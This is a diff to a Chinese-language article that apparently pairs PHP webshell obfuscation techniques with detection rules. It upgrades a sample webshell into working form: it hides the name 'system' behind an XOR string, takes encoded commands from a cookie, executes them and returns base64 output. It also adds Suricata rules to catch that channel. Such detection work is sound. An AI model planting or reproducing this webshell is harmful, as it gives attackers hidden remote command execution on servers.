@@ -110,10 +110,13 @@ $f($c);                                                  // 变量函数调用
 
 ```php
 <?php
-// 用异或运算式还原函数名（静态端是纯运算式）
-$f = ('~'.'#') ^ ('0'.'!');       // 结果 "system"（骨架示例，实际按码点算）
-// 指令放 Cookie，响应 base64+异或回包
-$c = base64_decode($_COOKIE['s']);
+// 用异或运算式还原函数名（静态端是纯运算式，无函数名明文）
+// 码点验算：'2825$,' ^ 'AAAAAA' = "system"
+//   '2'(0x32)^'A'(0x41)=0x73='s'  '8'(0x38)^'A'=0x79='y'  '2'^'A'='s'
+//   '5'(0x35)^'A'=0x74='t'  '$'(0x24)^'A'=0x65='e'  ','(0x2C)^'A'=0x6D='m'
+$f = '2825$,' ^ 'AAAAAA';        // "system"（本地验证：php -r "echo '2825\$,'^'AAAAAA';"）
+// 指令放 Cookie，响应 base64+异或回包（一次性语义：密钥每次会话轮换）
+$c = base64_decode(strtr($_COOKIE['s'], '-_', '+/'));
 for ($i = 0; $i < strlen($c); $i++) $c[$i] = $c[$i] ^ 0x5a;
 $out = ($f)($c . ' 2>&1');        // 拼 stderr，捕获完整输出
 echo base64_encode($out);
@@ -212,13 +215,25 @@ rule php_obfuscated_webshell_generic {
 ### 10.2 流量规则（Suricata/NDR 方向）
 
 ```yaml
-# 检测指令承载于 Cookie + 响应 base64（骨架）
+# 检测指令承载于 Cookie + 响应纯 base64（完整规则：cookie 缓冲关键字 + 体积比辅助）
 alert http any any -> any any (
   msg:"suspicious cookie-based command channel";
-  content:"Cookie"; http_header;
-  content:"|3d|"; within:64;           # 参数=密文
-  http.response_body; pcre:"/^[A-Za-z0-9+\/]{40,}={0,2}$/";  # 响应纯 base64
+  flow:established,to_server;
+  content:"|0d 0a|Cookie|3a|"; http_header; nocase;
+  http.cookie; pcre:"/[A-Za-z0-9+\/=_-]{40,}/";          # Cookie 值 = 密文级长度/字符集
+  threshold:type limit, track by_src, count 1, seconds 60; # 低频单发特征
+  sid:900001; rev:1;
 )
+alert http any any -> any any (
+  msg:"high-entropy base64 response from web app";
+  flow:established,to_client;
+  http.response_body;
+  content:"|0d 0a 0d 0a|"; nocase;
+  pcre:"/^[A-Za-z0-9+\/]{64,}={0,2}$/";                   # 响应纯 base64 且超长
+  sid:900002; rev:1;
+)
+# 关联判据：同一会话内 cookie 密文请求 + base64 响应成对出现（flowbits 关联或
+# SIEM 双规则命中计数 ≥2）——单条命中不足以判定，组合关联才报警
 ```
 
 ### 10.3 双向映射小结
